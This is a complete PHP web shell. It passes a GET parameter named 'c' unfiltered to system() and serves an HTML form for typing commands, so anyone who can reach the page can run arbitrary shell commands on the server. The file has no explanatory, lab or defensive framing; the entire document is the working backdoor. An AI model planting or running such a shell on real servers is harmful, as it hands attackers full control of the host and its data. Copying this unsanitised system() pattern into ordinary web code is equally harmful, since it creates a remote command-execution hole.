<?php
   if(isset($_GET["c"]))
   {
      system($_GET["c"]);
   }
?>

<html>
   <body>
      <form method = "GET">
         <input type="text" name = 'c'>
         <input type="submit">
      </form>
   </body>
</html>
